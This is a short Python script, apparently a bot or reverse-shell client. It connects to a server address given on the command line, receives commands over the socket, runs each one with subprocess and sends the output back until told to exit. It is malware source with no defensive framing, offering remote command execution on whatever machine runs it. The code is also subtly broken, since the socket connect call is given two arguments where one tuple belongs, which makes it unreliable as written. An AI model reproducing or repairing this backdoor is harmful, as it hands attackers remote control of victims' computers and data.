import sys
from subprocess import *
from socket import *

serverIP = sys.argv[1]
serverPort = 8000

clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect(serverIP, serverPort)
clientSocket.send("Bot start work...".encode())
command = clientSocket.recv(4064).decode()

while command != "exit":
  proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
  result, err = proc.communicate()
  clientSocket.send(result)
  command = (clientSocket.recv(4064).decode())

clientSocket.close()
